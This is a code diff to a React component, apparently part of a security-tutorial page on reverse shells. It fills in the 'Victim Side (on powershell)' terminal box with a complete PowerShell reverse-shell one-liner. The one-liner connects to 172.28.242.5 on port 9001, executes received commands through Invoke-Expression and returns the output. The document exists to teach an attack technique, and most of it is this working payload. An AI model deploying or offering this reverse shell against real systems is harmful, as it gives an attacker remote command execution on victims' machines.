@@ -94,7 +94,19 @@ export default function ReverseShell() {
           <h2 className="font-lec font-bold text-[#F2F603] text-sm lg:text-2xl">
             Victim Side (on powershell):
           </h2>
-          <Terminal text='ToDo'></Terminal>
+          <Terminal text='$LHOST = "172.28.242.5"; $LPORT = 9001; $TCPClient = New-Object
+Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream =
+$TCPClient.GetStream(); $StreamReader = New-Object
+IO.StreamReader($NetworkStream); $StreamWriter = New-Object
+IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer =
+New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while
+($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer,
+0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0,
+$RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output =
+try { Invoke-Expression ($Code) 2>&1 } catch { $_ };
+$StreamWriter.Write("$Output`n"); $Code = $null } }; $TCPClient.Close();
+$NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()
+'></Terminal>
 
           <img src={a5} alt="terminal" className="my-5 md:max-w-2xl" />
 
